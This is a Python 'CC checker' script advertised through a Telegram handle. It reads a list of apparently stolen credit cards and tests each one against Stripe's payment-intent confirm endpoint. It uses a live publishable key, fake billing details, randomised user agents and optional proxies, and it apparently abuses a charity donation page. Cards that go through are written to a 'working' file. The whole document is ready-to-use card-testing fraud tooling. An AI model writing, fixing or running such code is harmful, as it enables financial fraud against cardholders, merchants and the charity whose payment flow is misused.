art = """

░█▀▀░█▀▀░░░█▀▀░█░█░█▀▀░█▀▀░█░█░█▀▀░█▀▄░░
░█░░░█░░░░░█░░░█▀█░█▀▀░█░░░█▀▄░█▀▀░█▀▄░░
░▀▀▀░▀▀▀░░░▀▀▀░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀░░
            by https://t.me/DarkSathanHell 
            Contact me if you want more script

"""

print(art)

import requests
from requests.auth import HTTPProxyAuth
import json
import urllib3
from fake_useragent import UserAgent
from urllib3.exceptions import InsecureRequestWarning
import time
from test2 import muid, guid, sid  # Getting the muid, gid, sid from test2
from test3 import pi_before_secret, pi_after_secret
from test4 import email
import random




# By https://t.me/DarkSathanHell 
            #Contact me if you want more script

print("In this script you have too have a file called cc.txt<=(Your combo list) in the same folder")

ua = UserAgent()
random_user_agent = ua.random

ask = input("Do you want to use proxy(Yes or No): ")
if ask == ("yes" or "y" or "Yes" or "YES" or "Y"):
    proxy_ip = input("Enter your proxy ip: ")
    proxy_port = input("Enter your proxy port: ")     
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
    proxy_url = "https://"+proxy_ip+":"+proxy_port

    proxy = {
    "http": f"{proxy_url}",
    "https": f"{proxy_url}",
}

    auth = input("Is your proxy has username and a password yes or no")
    if auth == ("yes" or "y" or "Yes" or "YES" or "Y"):
        username = input("Enter your proxy username: ")     
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
        password = input("Enter your proxy password: ")
        proxy_auth = HTTPProxyAuth(username, password)
    else:
        proxy_auth= None
else:
    x = None





# Disable SSL warnings
urllib3.disable_warnings(InsecureRequestWarning)

url = "https://api.stripe.com/v1/payment_intents/" + pi_before_secret + "/confirm"

headers = {
    "Accept": "application/json",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://js.stripe.com",
    "Referer": "https://js.stripe.com/",
    "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Brave";v="120"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",                 
    "Sec-Fetch-Site": "same-site",
    "Sec-Gpc": "1",
    "User-Agent": random_user_agent,
}

# Read credit card information from the file
with open("cc.txt", "r") as file:    
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
    credit_card_lines = file.readlines()
   
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
# Create new files to store working and declined credit cards
working_file = open("working_cc.txt", "w")
declined_file = open("declined_cc.txt", "w")

for credit_card_line in credit_card_lines:
    # Randomly select a credit card entry
    credit_card_info = credit_card_line.strip().split("|")

    # Populate payload with credit card information
    payload = {
        "payment_method_data[type]": "card",
        "payment_method_data[billing_details][address][city]": "fsfsfsf",
        "payment_method_data[billing_details][address][line1]": "2865 Haven Lane",
        "payment_method_data[billing_details][address][line2]": "fgssgsgw",
        "payment_method_data[billing_details][address][postal_code]": "10008",
        "payment_method_data[billing_details][email]": email,
        "payment_method_data[billing_details][phone]": "4345757776",
        "payment_method_data[card][number]": credit_card_info[0],
        "payment_method_data[card][cvc]": credit_card_info[3],
        "payment_method_data[card][exp_month]": credit_card_info[1],
        "payment_method_data[card][exp_year]": credit_card_info[2],
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        "payment_method_data[payment_user_agent]": "stripe.js/5816dc8685; stripe-js-v3/5816dc8685; split-card-element",
        "payment_method_data[referrer]": "https://secure.nhscharitiestogether.co.uk",
        "payment_method_data[time_on_page]": "289126",
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_OAPmtPnNqw8kMu99DZqVYhZg00Qih4ny65",
        "client_secret": pi_before_secret + "_secret_" + pi_after_secret,
    }

    if ask != ("yes" or "y" or "Yes" or "YES" or "Y"):
        response =  requests.post(url, headers=headers, data=payload, verify=False)
    else:
        response = requests.post(url, headers=headers, data=payload, verify=False, proxies=proxy_auth)

    if response.status_code == 200:      
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
        print(f"Card {credit_card_info[0]} is working.")
        print(response.json())
        working_file.write(credit_card_line)
    else:     
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
        print(f"Card {credit_card_info[0]} is declined.")
        declined_file.write(credit_card_line)

# Close the files
working_file.close()    
# By https://t.me/DarkSathanHell 
            #Contact me if you want more script
declined_file.close()
